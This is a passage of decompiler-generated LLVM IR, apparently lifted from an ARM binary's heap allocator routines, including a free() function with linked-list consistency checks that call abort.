  %v2_17198 = inttoptr i32 %v1_17198 to i32*
  %v3_17198 = load i32, i32* %v2_17198, align 4
  store i32 %v3_17198, i32* %r3.global-to-local, align 4
  %v9_1719c = icmp eq i32 %v3_17198, %v0_17184
  br i1 %v9_1719c, label %dec_label_pc_171a8, label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17184, %dec_label_pc_17148, %dec_label_pc_1712c, %dec_label_pc_17198
  %v0_171a4 = call i32 @abort()
  store i32 %v0_171a4, i32* @r0, align 4
  %v0_171a8.pre = load i32, i32* @ip, align 4
  %v1_171a8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_171a8

dec_label_pc_171a8:                               ; preds = %dec_label_pc_17198, %dec_label_pc_171a4
  %v1_171a8 = phi i32 [ %v3_17190, %dec_label_pc_17198 ], [ %v1_171a8.pre, %dec_label_pc_171a4 ]
  %v0_171a8 = phi i32 [ %v3_17184, %dec_label_pc_17198 ], [ %v0_171a8.pre, %dec_label_pc_171a4 ]
  %v2_171a8 = add i32 %v1_171a8, 8
  %v3_171a8 = inttoptr i32 %v2_171a8 to i32*
  store i32 %v0_171a8, i32* %v3_171a8, align 4
  %v0_171ac = load i32, i32* %r2.global-to-local, align 4
  %v1_171ac = load i32, i32* @ip, align 4
  %v2_171ac = add i32 %v1_171ac, 12
  %v3_171ac = inttoptr i32 %v2_171ac to i32*
  store i32 %v0_171ac, i32* %v3_171ac, align 4
  %v0_171b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_171b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_171b0 = add i32 %v1_171b0, %v0_171b0
  store i32 %v2_171b0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_171b4

dec_label_pc_171b4:                               ; preds = %dec_label_pc_17170.dec_label_pc_171b4_crit_edge, %dec_label_pc_171a8
  %v0_171b8 = phi i32 [ %v0_171b8.pre, %dec_label_pc_17170.dec_label_pc_171b4_crit_edge ], [ %v2_171b0, %dec_label_pc_171a8 ]
  %v0_171b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_171b4 = add i32 %v0_171b4, 8
  %v2_171b4 = inttoptr i32 %v1_171b4 to i32*
  %v3_171b4 = load i32, i32* %v2_171b4, align 4
  store i32 %v3_171b4, i32* %r2.global-to-local, align 4
  %v1_171b8 = or i32 %v0_171b8, 1
  store i32 %v1_171b8, i32* %r3.global-to-local, align 4
  %v0_171bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_171bc, i32* %v2_171b4, align 4
  %v0_171c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_171c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_171c0 = add i32 %v1_171c0, 12
  %v3_171c0 = inttoptr i32 %v2_171c0 to i32*
  store i32 %v0_171c0, i32* %v3_171c0, align 4
  %v0_171c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_171c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_171c4 = add i32 %v1_171c4, %v0_171c4
  %v4_171c4 = inttoptr i32 %v3_171c4 to i32*
  store i32 %v0_171c4, i32* %v4_171c4, align 4
  %v0_171c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_171c8 = add i32 %v1_171c8, 4
  %v3_171c8 = inttoptr i32 %v2_171c8 to i32*
  store i32 %v0_171c8, i32* %v3_171c8, align 4
  %v0_171cc = load i32, i32* %r2.global-to-local, align 4
  %v1_171cc = load i32, i32* %r1.global-to-local, align 4
  %v2_171cc = add i32 %v1_171cc, 8
  %v3_171cc = inttoptr i32 %v2_171cc to i32*
  store i32 %v0_171cc, i32* %v3_171cc, align 4
  %v0_171d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_171d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_171d0 = add i32 %v1_171d0, 12
  %v3_171d0 = inttoptr i32 %v2_171d0 to i32*
  store i32 %v0_171d0, i32* %v3_171d0, align 4
  br label %dec_label_pc_171e8

dec_label_pc_171d8:                               ; preds = %dec_label_pc_17160
  %v2_171d8 = add i32 %v1_17168, %v0_171d8
  %v1_171dc = or i32 %v2_171d8, 1
  store i32 %v1_171dc, i32* %r3.global-to-local, align 4
  %v1_171e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_171e0 = add i32 %v1_171e0, 4
  %v3_171e0 = inttoptr i32 %v2_171e0 to i32*
  store i32 %v1_171dc, i32* %v3_171e0, align 4
  %v0_171e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_171e4 = load i32, i32* @r4, align 4
  %v2_171e4 = add i32 %v1_171e4, 44
  %v3_171e4 = inttoptr i32 %v2_171e4 to i32*
  store i32 %v0_171e4, i32* %v3_171e4, align 4
  br label %dec_label_pc_171e8

dec_label_pc_171e8:                               ; preds = %dec_label_pc_171b4, %dec_label_pc_171d8
  %v0_171e8 = load i32, i32* %sl.global-to-local, align 4
  %v2_171e8 = icmp eq i32 %v0_171e8, 0
  store i32 %v0_171e8, i32* %r1.global-to-local, align 4
  br i1 %v2_171e8, label %dec_label_pc_171f4.loopexit, label %dec_label_pc_17110

dec_label_pc_171f4.loopexit:                      ; preds = %dec_label_pc_171e8
  %v0_171f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_171f4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_171f4

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171f4.loopexit, %dec_label_pc_17100
  %v1_171f4 = phi i32 [ %v1_171f4.pre, %dec_label_pc_171f4.loopexit ], [ %v1_171f410, %dec_label_pc_17100 ]
  %v0_171fc = phi i32 [ %v0_171f4.pre, %dec_label_pc_171f4.loopexit ], [ %v1_1710c, %dec_label_pc_17100 ]
  %v9_171f4 = icmp eq i32 %v0_171fc, %v1_171f4
  br i1 %v9_171f4, label %dec_label_pc_1726c, label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171f4
  %v1_171fc = add i32 %v0_171fc, 4
  store i32 %v1_171fc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17100

dec_label_pc_17204.dec_label_pc_17204_crit_edge:  ; preds = %dec_label_pc_17204.preheader, %dec_label_pc_17204.dec_label_pc_17204_crit_edge
  %v0_17204.pre = load i32, i32* @r4, align 4
  %v1_17204.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_17204 = mul i32 %v1_17204.pre, 8
  %v5_17204 = add i32 %v4_17204, %v0_17204.pre
  %v1_17208 = add i32 %v1_17204.pre, 1
  store i32 %v1_17208, i32* %r2.global-to-local, align 4
  %v1_1720c = add i32 %v5_17204, 44
  store i32 %v1_1720c, i32* %r3.global-to-local, align 4
  %v2_17214 = add i32 %v5_17204, 52
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  store i32 %v1_1720c, i32* %v3_17214, align 4
  %v0_17218 = load i32, i32* %r3.global-to-local, align 4
  %v2_17218 = add i32 %v0_17218, 12
  %v3_17218 = inttoptr i32 %v2_17218 to i32*
  store i32 %v0_17218, i32* %v3_17218, align 4
  %v7_1721c = icmp sgt i32 %v1_17208, 95
  br i1 %v7_1721c, label %dec_label_pc_17220, label %dec_label_pc_17204.dec_label_pc_17204_crit_edge

dec_label_pc_17220:                               ; preds = %dec_label_pc_17204.dec_label_pc_17204_crit_edge
  %v0_17220 = load i32, i32* @r4, align 4
  %v1_17220 = inttoptr i32 %v0_17220 to i32*
  %v2_17220 = load i32, i32* %v1_17220, align 4
  store i32 %v2_17220, i32* %r2.global-to-local, align 4
  %v1_17224 = add i32 %v0_17220, 864
  %v2_17224 = inttoptr i32 %v1_17224 to i32*
  %v3_17224 = load i32, i32* %v2_17224, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1722c = urem i32 %v2_17220, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_17234 = or i32 %v3_17224, 1
  store i32 %v1_17234, i32* %r1.global-to-local, align 4
  %v1_17238 = or i32 %v1_1722c, 72
  store i32 %v1_17238, i32* %r2.global-to-local, align 4
  %v1_1723c = add i32 %v0_17220, 52
  store i32 %v1_1723c, i32* @ip, align 4
  %v2_17240 = add i32 %v0_17220, 840
  %v3_17240 = inttoptr i32 %v2_17240 to i32*
  store i32 0, i32* %v3_17240, align 4
  %v0_17244 = load i32, i32* %r3.global-to-local, align 4
  %v1_17244 = add i32 %v0_17244, 65536
  store i32 %v1_17244, i32* %r3.global-to-local, align 4
  %v0_17248 = load i32, i32* %r0.global-to-local, align 4
  %v1_17248 = load i32, i32* @r4, align 4
  %v2_17248 = add i32 %v1_17248, 836
  %v3_17248 = inttoptr i32 %v2_17248 to i32*
  store i32 %v0_17248, i32* %v3_17248, align 4
  %v0_1724c = load i32, i32* %r0.global-to-local, align 4
  %v1_1724c = load i32, i32* @r4, align 4
  %v2_1724c = add i32 %v1_1724c, 844
  %v3_1724c = inttoptr i32 %v2_1724c to i32*
  store i32 %v0_1724c, i32* %v3_1724c, align 4
  %v1_17250 = load i32, i32* @r4, align 4
  %v2_17250 = add i32 %v1_17250, 852
  %v3_17250 = inttoptr i32 %v2_17250 to i32*
  store i32 %v1_17244, i32* %v3_17250, align 4
  %v1_17254 = load i32, i32* @r4, align 4
  %v2_17254 = add i32 %v1_17254, 864
  %v3_17254 = inttoptr i32 %v2_17254 to i32*
  store i32 %v1_17234, i32* %v3_17254, align 4
  %v1_17258 = load i32, i32* @r4, align 4
  %v2_17258 = inttoptr i32 %v1_17258 to i32*
  store i32 %v1_17238, i32* %v2_17258, align 4
  %v0_1725c = load i32, i32* @ip, align 4
  %v1_1725c = load i32, i32* @r4, align 4
  %v2_1725c = add i32 %v1_1725c, 44
  %v3_1725c = inttoptr i32 %v2_1725c to i32*
  store i32 %v0_1725c, i32* %v3_1725c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_17264 = call i32 @sysconf(i32 30, i32 %v1_17234, i32 %v1_17238, i32 %v1_17244)
  store i32 %v4_17264, i32* @r0, align 4
  %v1_17268 = load i32, i32* @r4, align 4
  %v2_17268 = add i32 %v1_17268, 860
  %v3_17268 = inttoptr i32 %v2_17268 to i32*
  store i32 %v4_17264, i32* %v3_17268, align 4
  br label %dec_label_pc_1726c

dec_label_pc_1726c:                               ; preds = %dec_label_pc_171f4, %dec_label_pc_17220
  %v2_17270 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17270, i32* @r4, align 4
  %v1_17274 = load i32, i32* @r0, align 4
  ret i32 %v1_17274

; uselistorder directives
  uselistorder i32 %v0_17220, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17218, { 1, 0 }
  uselistorder i32 %v1_171fc, { 1, 0 }
  uselistorder i32 %v0_171e8, { 0, 2, 1 }
  uselistorder i32 %v0_171c4, { 1, 0 }
  uselistorder i32 %v1_17114, { 1, 0, 2 }
  uselistorder i32 %v0_1712c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_170ec, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1726c, { 1, 0 }
  uselistorder label %dec_label_pc_17204.dec_label_pc_17204_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_171e8, { 1, 0 }
  uselistorder label %dec_label_pc_171b4, { 1, 0 }
  uselistorder label %dec_label_pc_171a8, { 1, 0 }
  uselistorder label %dec_label_pc_171a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17160, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17278 = load i32, i32* @r4, align 4
  %v6_17278 = load i32, i32* @r5, align 4
  %v9_17278 = load i32, i32* @r6, align 4
  %v12_17278 = load i32, i32* @r7, align 4
  %v18_17278 = load i32, i32* @lr, align 4
  %v0_17280 = load i32, i32* @r0, align 4
  store i32 %v0_17280, i32* @r6, align 4
  %v2_17280 = icmp eq i32 %v0_17280, 0
  %v2_17284 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r7, align 4
  br i1 %v2_17280, label %dec_label_pc_1748c, label %dec_label_pc_17290

dec_label_pc_17290:                               ; preds = %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_17294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 76) to i32*), align 4
  store i32 %v4_17294, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_17294, i32* %r2.global-to-local, align 4
  %v4_172a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), align 4
  store i32 %v4_172a0, i32* %r1.global-to-local, align 4
  store i32 %v2_17284, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_172ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 %v4_172ac, i32* %ip.global-to-local, align 4
  store i32 94904, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_172ac)
  %v0_172b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_172b8, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_172c0 = load i32, i32* @r7, align 4
  %v2_172c0 = add i32 %v0_172c0, 20
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  %v4_172c0 = load i32, i32* %v3_172c0, align 4
  store i32 %v4_172c0, i32* %ip.global-to-local, align 4
  store i32 94924, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_172c0)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_172d0 = load i32, i32* @r7, align 4
  %v2_172d0 = add i32 %v0_172d0, 36
  %v3_172d0 = inttoptr i32 %v2_172d0 to i32*
  %v4_172d0 = load i32, i32* %v3_172d0, align 4
  store i32 %v4_172d0, i32* @lr, align 4
  %v0_172d4 = load i32, i32* @r6, align 4
  %v1_172d4 = add i32 %v0_172d4, -4
  %v2_172d4 = inttoptr i32 %v1_172d4 to i32*
  %v3_172d4 = load i32, i32* %v2_172d4, align 4
  store i32 %v3_172d4, i32* %r2.global-to-local, align 4
  %v1_172d8 = inttoptr i32 %v4_172d0 to i32*
  %v2_172d8 = load i32, i32* %v1_172d8, align 4
  store i32 %v2_172d8, i32* %r3.global-to-local, align 4
  %v1_172dc = and i32 %v3_172d4, -4
  store i32 %v1_172dc, i32* %ip.global-to-local, align 4
  %v1_172e0 = add i32 %v0_172d4, -8
  store i32 %v1_172e0, i32* @r5, align 4
  store i32 %v1_172e0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_172dc, %v2_172d8
  br i1 %tmp, label %dec_label_pc_17310, label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_17290
  %v1_172f0 = or i32 %v2_172d8, 3
  store i32 %v1_172f0, i32* %r3.global-to-local, align 4
  store i32 %v1_172f0, i32* %v1_172d8, align 4
  %v3_172f4 = load i32, i32* @lr, align 4
  %v4_172f4 = add i32 %v3_172f4, -8
  store i32 %v4_172f4, i32* %lr.global-to-local, align 4
  %v0_172f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_172f8 = udiv i32 %v0_172f8, 8
  store i32 %v3_172f8, i32* %r1.global-to-local, align 4
  %v1_172fc = add i32 %v3_172f4, -4
  store i32 %v1_172fc, i32* @r2, align 4
  %v4_17300 = mul nuw i32 %v3_172f8, 4
  %v5_17300 = add i32 %v4_17300, %v1_172fc
  %v6_17300 = inttoptr i32 %v5_17300 to i32*
  %v7_17300 = load i32, i32* %v6_17300, align 4
  store i32 %v7_17300, i32* %r3.global-to-local, align 4
  %v1_17304 = load i32, i32* @r5, align 4
  %v2_17304 = add i32 %v1_17304, 8
  %v3_17304 = inttoptr i32 %v2_17304 to i32*
  store i32 %v7_17300, i32* %v3_17304, align 4
  %v0_17308 = load i32, i32* @r5, align 4
  %v1_17308 = load i32, i32* @r2, align 4
  %v2_17308 = load i32, i32* %r1.global-to-local, align 4
  %v5_17308 = mul i32 %v2_17308, 4
  %v6_17308 = add i32 %v5_17308, %v1_17308
  %v7_17308 = inttoptr i32 %v6_17308 to i32*
  store i32 %v0_17308, i32* %v7_17308, align 4
  br label %dec_label_pc_17474

dec_label_pc_17310:                               ; preds = %dec_label_pc_17290
  %v1_17310 = and i32 %v3_172d4, 2
  %v2_17310 = icmp eq i32 %v1_17310, 0
  br i1 %v2_17310, label %dec_label_pc_17318, label %dec_label_pc_1744c

dec_label_pc_17318:                               ; preds = %dec_label_pc_17310
  %v1_17318 = or i32 %v2_172d8, 1
  store i32 %v1_17318, i32* %r3.global-to-local, align 4
  store i32 %v1_17318, i32* %v1_172d8, align 4
  %v0_17320 = load i32, i32* @r6, align 4
  %v1_17320 = add i32 %v0_17320, -4
  %v2_17320 = inttoptr i32 %v1_17320 to i32*
  %v3_17320 = load i32, i32* %v2_17320, align 4
  store i32 %v3_17320, i32* %r3.global-to-local, align 4
  %v0_17324 = load i32, i32* @r5, align 4
  %v1_17324 = load i32, i32* %ip.global-to-local, align 4
  %v2_17324 = add i32 %v1_17324, %v0_17324
  store i32 %v2_17324, i32* %lr.global-to-local, align 4
  %v1_17328 = urem i32 %v3_17320, 2
  %v2_17328 = icmp eq i32 %v1_17328, 0
  %v1_1732c = add i32 %v2_17324, 4
  %v2_1732c = inttoptr i32 %v1_1732c to i32*
  %v3_1732c = load i32, i32* %v2_1732c, align 4
  store i32 %v3_1732c, i32* %r8.global-to-local, align 4
  br i1 %v2_17328, label %dec_label_pc_17334, label %dec_label_pc_17368

dec_label_pc_17334:                               ; preds = %dec_label_pc_17318
  %v1_17334 = add i32 %v0_17320, -8
  %v2_17334 = inttoptr i32 %v1_17334 to i32*
  %v3_17334 = load i32, i32* %v2_17334, align 4
  store i32 %v3_17334, i32* %r1.global-to-local, align 4
  %v2_17338 = sub i32 %v0_17324, %v3_17334
  store i32 %v2_17338, i32* %r3.global-to-local, align 4
  %v1_1733c = add i32 %v2_17338, 8
  %v2_1733c = inttoptr i32 %v1_1733c to i32*
  %v3_1733c = load i32, i32* %v2_1733c, align 4
  store i32 %v3_1733c, i32* %r2.global-to-local, align 4
  %v1_17340 = add i32 %v3_1733c, 12
  %v2_17340 = inttoptr i32 %v1_17340 to i32*
  %v3_17340 = load i32, i32* %v2_17340, align 4
  store i32 %v3_17340, i32* %r4.global-to-local, align 4
  %v9_17344 = icmp eq i32 %v3_17340, %v2_17338
  %v1_17348 = add i32 %v2_17338, 12
  %v2_17348 = inttoptr i32 %v1_17348 to i32*
  %v3_17348 = load i32, i32* %v2_17348, align 4
  store i32 %v3_17348, i32* %r0.global-to-local, align 4
  br i1 %v9_17344, label %dec_label_pc_17350, label %dec_label_pc_173b4

dec_label_pc_17350:                               ; preds = %dec_label_pc_17334
  %v1_17350 = add i32 %v3_17348, 8
  %v2_17350 = inttoptr i32 %v1_17350 to i32*
  %v3_17350 = load i32, i32* %v2_17350, align 4
  store i32 %v3_17350, i32* %r3.global-to-local, align 4
  %v9_17354 = icmp eq i32 %v3_17350, %v2_17338
  br i1 %v9_17354, label %dec_label_pc_1735c, label %dec_label_pc_173b4

dec_label_pc_1735c:                               ; preds = %dec_label_pc_17350
  store i32 %v3_1733c, i32* %v2_17350, align 4
  %v0_17360 = load i32, i32* %r0.global-to-local, align 4
  %v1_17360 = load i32, i32* %r2.global-to-local, align 4
  %v2_17360 = add i32 %v1_17360, 12
  %v3_17360 = inttoptr i32 %v2_17360 to i32*
  store i32 %v0_17360, i32* %v3_17360, align 4
  %v0_17364 = load i32, i32* %ip.global-to-local, align 4
  %v1_17364 = load i32, i32* %r1.global-to-local, align 4
  %v2_17364 = add i32 %v1_17364, %v0_17364
  store i32 %v2_17364, i32* %ip.global-to-local, align 4
  %v0_17374.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17378.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %dec_label_pc_17318, %dec_label_pc_1735c
  %v0_173f4 = phi i32 [ %v1_17324, %dec_label_pc_17318 ], [ %v2_17364, %dec_label_pc_1735c ]
  %v0_17378 = phi i32 [ %v3_1732c, %dec_label_pc_17318 ], [ %v0_17378.pre, %dec_label_pc_1735c ]
  %v1_1738c = phi i32 [ %v2_17324, %dec_label_pc_17318 ], [ %v0_17374.pre, %dec_label_pc_1735c ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1736c = load i32, i32* @r7, align 4
  %v2_1736c = add i32 %v0_1736c, 36
  %v3_1736c = inttoptr i32 %v2_1736c to i32*
  %v4_1736c = load i32, i32* %v3_1736c, align 4
  store i32 %v4_1736c, i32* @r2, align 4
  %v1_17370 = add i32 %v4_1736c, 44
  %v2_17370 = inttoptr i32 %v1_17370 to i32*
  %v3_17370 = load i32, i32* %v2_17370, align 4
  store i32 %v3_17370, i32* %r3.global-to-local, align 4
  %v9_17374 = icmp eq i32 %v1_1738c, %v3_17370
  %v1_17378 = and i32 %v0_17378, -4
  store i32 %v1_17378, i32* %r0.global-to-local, align 4
  br i1 %v9_17374, label %dec_label_pc_173f4, label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_17368
  %v2_17380 = add i32 %v1_1738c, %v1_17378
  store i32 %v2_17380, i32* %r3.global-to-local, align 4
  %v1_17384 = add i32 %v2_17380, 4
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  store i32 %v3_17384, i32* %r3.global-to-local, align 4
  %v1_17388 = urem i32 %v3_17384, 2
  %v2_17388 = icmp eq i32 %v1_17388, 0
  %v2_1738c = add i32 %v1_1738c, 4
  %v3_1738c = inttoptr i32 %v2_1738c to i32*
  store i32 %v1_17378, i32* %v3_1738c, align 4
  br i1 %v2_17388, label %dec_label_pc_17394, label %dec_label_pc_17380.dec_label_pc_173c4_crit_edge

dec_label_pc_17380.dec_label_pc_173c4_crit_edge:  ; preds = %dec_label_pc_17380
  %v0_173d4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_173c4

dec_label_pc_17394:                               ; preds = %dec_label_pc_17380
  %v0_17394 = load i32, i32* %lr.global-to-local, align 4
  %v1_17394 = add i32 %v0_17394, 8
  %v2_17394 = inttoptr i32 %v1_17394 to i32*
  %v3_17394 = load i32, i32* %v2_17394, align 4
  store i32 %v3_17394, i32* %r1.global-to-local, align 4
  %v1_17398 = add i32 %v3_17394, 12
  %v2_17398 = inttoptr i32 %v1_17398 to i32*
  %v3_17398 = load i32, i32* %v2_17398, align 4
  store i32 %v3_17398, i32* %r3.global-to-local, align 4
  %v9_1739c = icmp eq i32 %v3_17398, %v0_17394
  %v1_173a0 = add i32 %v0_17394, 12
  %v2_173a0 = inttoptr i32 %v1_173a0 to i32*
  %v3_173a0 = load i32, i32* %v2_173a0, align 4
  store i32 %v3_173a0, i32* %r2.global-to-local, align 4
  br i1 %v9_1739c, label %dec_label_pc_173a8, label %dec_label_pc_173b4

dec_label_pc_173a8:                               ; preds = %dec_label_pc_17394
  %v1_173a8 = add i32 %v3_173a0, 8
  %v2_173a8 = inttoptr i32 %v1_173a8 to i32*
  %v3_173a8 = load i32, i32* %v2_173a8, align 4
  store i32 %v3_173a8, i32* %r3.global-to-local, align 4
  %v9_173ac = icmp eq i32 %v3_173a8, %v0_17394
  br i1 %v9_173ac, label %dec_label_pc_173b8, label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17394, %dec_label_pc_17350, %dec_label_pc_17334, %dec_label_pc_173a8
  %v0_173b4 = call i32 @abort()
  store i32 %v0_173b4, i32* %r0.global-to-local, align 4
  %v0_173b8.pre = load i32, i32* @r1, align 4
  %v1_173b8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %dec_label_pc_173a8, %dec_label_pc_173b4
  %v1_173b8 = phi i32 [ %v3_173a0, %dec_label_pc_173a8 ], [ %v1_173b8.pre, %dec_label_pc_173b4 ]
  %v0_173b8 = phi i32 [ %v3_17394, %dec_label_pc_173a8 ], [ %v0_173b8.pre, %dec_label_pc_173b4 ]
  %v2_173b8 = add i32 %v1_173b8, 8
  %v3_173b8 = inttoptr i32 %v2_173b8 to i32*
  store i32 %v0_173b8, i32* %v3_173b8, align 4
  %v0_173bc = load i32, i32* %r2.global-to-local, align 4
  %v1_173bc = load i32, i32* %r1.global-to-local, align 4
  %v2_173bc = add i32 %v1_173bc, 12
  %v3_173bc = inttoptr i32 %v2_173bc to i32*
  store i32 %v0_173bc, i32* %v3_173bc, align 4
  %v0_173c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_173c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_173c0 = add i32 %v1_173c0, %v0_173c0
  store i32 %v2_173c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_173c4

dec_label_pc_173c4:                               ; preds = %dec_label_pc_17380.dec_label_pc_173c4_crit_edge, %dec_label_pc_173b8
  %v0_173d4 = phi i32 [ %v0_173d4.pre, %dec_label_pc_17380.dec_label_pc_173c4_crit_edge ], [ %v2_173c0, %dec_label_pc_173b8 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_173c8 = load i32, i32* @r7, align 4
  %v2_173c8 = add i32 %v0_173c8, 36
  %v3_173c8 = inttoptr i32 %v2_173c8 to i32*
  %v4_173c8 = load i32, i32* %v3_173c8, align 4
  %v1_173cc = add i32 %v4_173c8, 52
  store i32 %v1_173cc, i32* %r3.global-to-local, align 4
  %v1_173d0 = add i32 %v4_173c8, 60
  %v2_173d0 = inttoptr i32 %v1_173d0 to i32*
  %v3_173d0 = load i32, i32* %v2_173d0, align 4
  store i32 %v3_173d0, i32* %r1.global-to-local, align 4
  %v1_173d4 = or i32 %v0_173d4, 1
  store i32 %v1_173d4, i32* @r2, align 4
  %v1_173d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_173d8 = add i32 %v1_173d8, 12
  %v3_173d8 = inttoptr i32 %v2_173d8 to i32*
  store i32 %v1_173cc, i32* %v3_173d8, align 4
  %v0_173dc = load i32, i32* %r1.global-to-local, align 4
  %v1_173dc = load i32, i32* %r4.global-to-local, align 4
  %v2_173dc = add i32 %v1_173dc, 8
  %v3_173dc = inttoptr i32 %v2_173dc to i32*
  store i32 %v0_173dc, i32* %v3_173dc, align 4
  %v0_173e0 = load i32, i32* @r2, align 4
  %v1_173e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_173e0 = add i32 %v1_173e0, 4
  %v3_173e0 = inttoptr i32 %v2_173e0 to i32*
  store i32 %v0_173e0, i32* %v3_173e0, align 4
  %v0_173e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_173e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_173e4 = add i32 %v1_173e4, %v0_173e4
  %v4_173e4 = inttoptr i32 %v3_173e4 to i32*
  store i32 %v0_173e4, i32* %v4_173e4, align 4
  %v0_173e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_173e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_173e8 = add i32 %v1_173e8, 12
  %v3_173e8 = inttoptr i32 %v2_173e8 to i32*
  store i32 %v0_173e8, i32* %v3_173e8, align 4
  %v0_173ec = load i32, i32* %r4.global-to-local, align 4
  %v1_173ec = load i32, i32* %r3.global-to-local, align 4
  %v2_173ec = add i32 %v1_173ec, 8
  %v3_173ec = inttoptr i32 %v2_173ec to i32*
  store i32 %v0_173ec, i32* %v3_173ec, align 4
  br label %dec_label_pc_17404

dec_label_pc_173f4:                               ; preds = %dec_label_pc_17368
  %v2_173f4 = add i32 %v1_17378, %v0_173f4
  store i32 %v2_173f4, i32* %ip.global-to-local, align 4
  %v1_173f8 = or i32 %v2_173f4, 1
  store i32 %v1_173f8, i32* %r3.global-to-local, align 4
  %v0_173fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_173fc, i32* %v2_17370, align 4
  %v0_17400 = load i32, i32* %r3.global-to-local, align 4
  %v1_17400 = load i32, i32* %r4.global-to-local, align 4
  %v2_17400 = add i32 %v1_17400, 4
  %v3_17400 = inttoptr i32 %v2_17400 to i32*
  store i32 %v0_17400, i32* %v3_17400, align 4
  br label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_173c4, %dec_label_pc_173f4
  %v0_17404 = load i32, i32* %ip.global-to-local, align 4
  %v3_17408 = icmp ult i32 %v0_17404, 131070
  br i1 %v3_17408, label %dec_label_pc_17474, label %dec_label_pc_1740c

dec_label_pc_1740c:                               ; preds = %dec_label_pc_17404
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_17410 = load i32, i32* @r7, align 4
